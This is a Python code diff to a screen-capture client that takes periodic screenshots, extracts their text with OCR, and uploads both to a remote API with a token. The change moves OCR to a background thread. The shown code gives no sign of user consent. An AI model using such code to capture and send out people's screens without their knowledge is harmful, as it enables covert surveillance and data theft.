@@ -15,6 +15,7 @@ import os
 import signal
 import sys
 import time
+from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 from pathlib import Path
 
@@ -31,7 +32,7 @@ from config import (
 )
 from core.capture import capture_screen, compress_image_for_upload, cleanup_old_captures
 from core.ocr import extract_text, get_ocr_reader
-from core.uploader import upload_to_api
+from core.uploader import upload_to_api, upload_image, upload_text
 from core.storage import (
     get_token, set_token,
     get_api_endpoint, set_api_endpoint,
@@ -55,6 +56,10 @@ logger = logging.getLogger(__name__)
 
 # Shutdown flag
 _running = True
+
+# OCR State
+_ocr_executor = ThreadPoolExecutor(max_workers=1)
+_ocr_future = None
 
 
 def signal_handler(signum, frame):
@@ -100,32 +105,55 @@ def is_running() -> bool:
         return False
 
 
-def run_capture_cycle(token: str, include_image: bool = True) -> None:
-    """Run a single capture -> OCR -> upload cycle. Silent on errors."""
+def _perform_ocr_and_upload(token: str, image_path: Path):
+    """Background task for OCR and text upload."""
     try:
-        # Capture screen
-        image_bytes, image_path = capture_screen()
-        
-        # Extract text
+        if not image_path.exists():
+            return
+            
+        # Extract text (Heavy)
         text = extract_text(image_path)
         
-        # Compress image for upload
-        compressed_image = None
-        if include_image:
-            compressed_image = compress_image_for_upload(image_path)
-        
-        # Upload (silent, fire-and-forget)
-        upload_to_api(
-            token=token,
-            text=text,
-            image_bytes=compressed_image,
-        )
-        
-        # Cleanup
+        # Upload Text
+        if text.strip():
+            upload_text(token, text)
+            logger.info(f"📝 OCR Text uploaded ({len(text)} chars)")
+            
+        # Cleanup image after OCR
         if image_path.exists():
             image_path.unlink()
+            
+    except Exception as e:
+        logger.error(f"❌ Background OCR failed: {e}")
+
+
+def run_capture_cycle(token: str, include_image: bool = True) -> None:
+    """Run a single capture -> immediate upload -> background OCR cycle."""
+    global _ocr_future
+    
+    try:
+        # 1. Capture screen
+        _, image_path = capture_screen()
         
-        logger.info(f"✅ Cycle complete: {len(text)} chars")
+        # 2. Upload Image (Instant)
+        if include_image:
+            try:
+                compressed_image = compress_image_for_upload(image_path)
+                upload_image(token, compressed_image)
+                logger.info(f"📸 Image uploaded (instant)")
+            except Exception as e:
+                logger.error(f"❌ Image upload failed: {e}")
+        
+        # 3. Handle OCR (Background)
+        # Only start if the previous one is finished to avoid CPU spike
+        if _ocr_future is None or _ocr_future.done():
+            _ocr_future = _ocr_executor.submit(_perform_ocr_and_upload, token, image_path)
+        else:
+            # Skip OCR for this frame if still processing previous one
+            # Cleanup image immediately if skipping OCR
+            if image_path.exists():
+                image_path.unlink()
+            logger.debug("Skipping OCR (previous task still running)")
         
     except Exception as e:
         logger.error(f"❌ Capture cycle failed: {e}")
